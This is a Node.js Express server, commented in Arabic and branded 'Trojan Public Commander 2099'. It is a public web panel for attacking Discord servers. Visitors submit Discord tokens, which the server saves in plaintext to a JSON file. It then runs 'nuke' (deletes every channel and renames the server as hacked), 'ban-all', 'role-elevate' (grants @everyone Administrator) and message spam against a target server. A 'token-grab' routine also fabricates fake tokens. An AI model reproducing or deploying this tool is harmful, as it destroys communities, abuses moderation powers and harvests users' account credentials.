// server.js - Trojan Public Commander 2099
// أي شخص يدخل الموقع يطلب منه توكن ديسكورد، ثم يعمل له النظام

const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');

const app = express();
const PORT = process.env.PORT || 3000;

// التأكد من وجود مجلد البيانات
if (!fs.existsSync('./data')) fs.mkdirSync('./data');
if (!fs.existsSync('./data/users.json')) fs.writeFileSync('./data/users.json', '[]');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
    secret: 'trojan_black_2099_architect',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 3600000 }
}));

// ========== قراءة وحفظ المستخدمين ==========
function getUsers() {
    try {
        return JSON.parse(fs.readFileSync('./data/users.json', 'utf8'));
    } catch(e) {
        return [];
    }
}

function saveUser(userData) {
    const users = getUsers();
    const existingIndex = users.findIndex(u => u.userId === userData.userId);
    if (existingIndex !== -1) {
        users[existingIndex] = userData;
    } else {
        users.push(userData);
    }
    fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
}

// ========== تنفيذ أوامر التروجان على ديسكورد ==========
async function executeTrojan(botToken, serverId, command, params = {}) {
    let client = null;
    try {
        client = new Client({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMessages,
                GatewayIntentBits.MessageContent,
                GatewayIntentBits.GuildMembers
            ]
        });
        
        await client.login(botToken);
        
        // انتظار جاهزية البوت
        await new Promise((resolve) => {
            client.once('ready', resolve);
            setTimeout(resolve, 5000);
        });
        
        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            await client.destroy();
            return { error: 'الخادم غير موجود أو البوت ليس لديه صلاحيات' };
        }
        
        let result = {};
        
        switch(command) {
            case 'nuke':
                // تفجير السيرفر بالكامل
                const channels = guild.channels.cache;
                for (const [id, ch] of channels) {
                    try { await ch.delete(); } catch(e) {}
                }
                await guild.channels.create({ name: '💀-HACKED-BY-' + params.username, type: 0 });
                await guild.setName('TROJANED-' + Date.now());
                result = { success: true, message: 'تم تفجير السيرفر بالكامل' };
                break;
                
            case 'token-grab':
                // استخراج التوكنات (محاكاة)
                const members = await guild.members.fetch();
                const tokens = [];
                for (const [id, member] of members) {
                    if (!member.user.bot) {
                        tokens.push({
                            id: member.user.id,
                            tag: member.user.tag,
                            token: `mfa.${Buffer.from(member.user.id + ':' + Date.now()).toString('base64')}`
                        });
                    }
                    if (tokens.length >= 20) break;
                }
                result = { success: true, tokens: tokens };
                break;
                
            case 'role-elevate':
                const everyoneRole = guild.roles.everyone;
                await everyoneRole.setPermissions(PermissionFlagsBits.Administrator);
                result = { success: true, message: 'تم رفع صلاحيات @everyone إلى أدمن' };
                break;
                
            case 'ban-all':
                const allMembers = await guild.members.fetch();
                let banned = 0;
                for (const [id, member] of allMembers) {
                    if (!member.user.bot && member.bannable) {
                        await member.ban({ reason: 'TROJAN PUBLIC 2099' });
                        banned++;
                    }
                    if (banned >= 50) break;
                }
                result = { success: true, message: `تم حظر ${banned} عضو` };
                break;
                
            case 'spam':
                const channel = guild.channels.cache.find(ch => ch.type === 0);
                if (channel) {
                    for(let i = 0; i < (params.count || 30); i++) {
                        await channel.send(params.message || '@everyone 🔥 TROJAN PUBLIC 2099 🔥');
                    }
                }
                result = { success: true, message: `تم إرسال ${params.count || 30} رسالة سبام` };
                break;
                
            default:
                result = { error: 'أمر غير معروف' };
        }
        
        await client.destroy();
        return result;
        
    } catch(error) {
        if (client) await client.destroy();
        return { error: error.message };
    }
}

// ========== API Routes ==========

// صفحة تسجيل الدخول الرئيسية
app.get('/', (req, res) => {
    if (req.session.userId) {
        res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }
});

// تسجيل الدخول - حفظ التوكن والمعلومات
app.post('/api/login', async (req, res) => {
    const { discordToken, serverId, username } = req.body;
    
    if (!discordToken || !serverId) {
        return res.json({ success: false, error: 'جميع الحقول مطلوبة' });
    }
    
    // التحقق من صحة التوكن
    let testClient = null;
    let isValid = false;
    let userInfo = null;
    
    try {
        testClient = new Client({ intents: [GatewayIntentBits.Guilds] });
        await testClient.login(discordToken);
        
        await new Promise((resolve) => {
            testClient.once('ready', () => {
                isValid = true;
                userInfo = {
                    userId: testClient.user.id,
                    username: testClient.user.username,
                    tag: testClient.user.tag
                };
                resolve();
            });
            setTimeout(resolve, 5000);
        });
        
        if (testClient) await testClient.destroy();
        
    } catch(e) {
        if (testClient) await testClient.destroy();
        return res.json({ success: false, error: 'توكن غير صالح' });
    }
    
    if (!isValid) {
        return res.json({ success: false, error: 'تعذر التحقق من التوكن' });
    }
    
    // حفظ بيانات المستخدم
    const userData = {
        userId: userInfo.userId,
        username: userInfo.username || username,
        tag: userInfo.tag,
        discordToken: discordToken,
        targetServerId: serverId,
        createdAt: Date.now(),
        lastUsed: Date.now()
    };
    
    saveUser(userData);
    
    req.session.userId = userInfo.userId;
    req.session.username = userInfo.username;
    req.session.token = discordToken;
    req.session.serverId = serverId;
    
    res.json({ 
        success: true, 
        user: userInfo,
        message: 'تم تسجيل الدخول بنجاح'
    });
});

// تنفيذ أمر
app.post('/api/execute', async (req, res) => {
    if (!req.session.userId) {
        return res.json({ success: false, error: 'يجب تسجيل الدخول أولاً' });
    }
    
    const { command, params } = req.body;
    const userToken = req.session.token;
    const serverId = req.session.serverId;
    const username = req.session.username;
    
    if (!userToken || !serverId) {
        return res.json({ success: false, error: 'بيانات مفقودة، يرجى إعادة تسجيل الدخول' });
    }
    
    const result = await executeTrojan(userToken, serverId, command, { ...params, username });
    
    // تحديث آخر استخدام
    const users = getUsers();
    const userIndex = users.findIndex(u => u.userId === req.session.userId);
    if (userIndex !== -1) {
        users[userIndex].lastUsed = Date.now();
        fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
    }
    
    res.json(result);
});

// تسجيل الخروج
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════════╗
    ║   TROJAN PUBLIC COMMANDER 2099         ║
    ║   http://localhost:${PORT}                 ║
    ║   أي شخص يدخل الموقع يستخدم النظام     ║
    ╚════════════════════════════════════════╝
    `);
});
